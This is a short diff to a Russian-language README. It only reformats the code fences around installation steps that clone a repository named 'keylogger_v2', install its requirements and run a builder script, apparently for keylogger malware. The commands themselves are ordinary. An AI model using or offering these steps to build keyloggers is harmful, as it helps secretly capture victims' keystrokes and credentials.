@@ -2,17 +2,12 @@
 
 Инструкция по установке:
 
-'''sh
-
+```sh
 git clone https://github.com/eXedna/keylogger_v2
-
 cd keylogger_v2
-
 python3 -m pip install -r req.txt
-
 python builder.py
-
-'''
+```
 
 [+]  Всё!
 
